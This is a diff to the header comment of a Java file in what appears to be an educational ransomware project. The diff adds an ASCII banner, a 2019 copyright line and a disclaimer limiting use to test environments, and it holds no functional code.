@@ -1,11 +1,19 @@
 /********************************************************************
     _____                        __        __
    |_   _|                      |  |      | |
-     | |   ___ _ __   __ ____ _ |  |  __  | |
-     | | /   _' |\ \ / //   _' ||  | /  \ | |
-   __/ / | (_ ) | \ V / | (_ ) |\  V  /\ V  /
-  \__ /  \____,_|  \_/  \____,_| \__/   \__/
+     | |   ___ _ __   __ ____ _ |  |  __  | | ____ _ _ __  ___
+     | | /  _ ' |\ \ / //  _ ' ||  | /  \ | |/  _ ' | '__/  _  \
+   __/ / | (_)  | \ V / | (_)  |\  V  /\ V  /| (_)  | |  |  ___/
+  \__ /  \____,_|  \_/  \____,_| \__/   \__/ \____,_|_|   \____|
 
+Copyright (c) 2019 Kyra Mozley
+Created on 18/07/19
+Version 1.0
+
+Disclaimer: This project is purely for educational purposes 
+DO NOT RUN THIS ON YOUR PERSONAL MACHINE
+EXECUTE ONLY IN A TEST ENVIRONMENT
+DO NOT USE FOR MALICIOUS ACTIVITY 
 
  *********************************************************************/
 package RansomeWare;
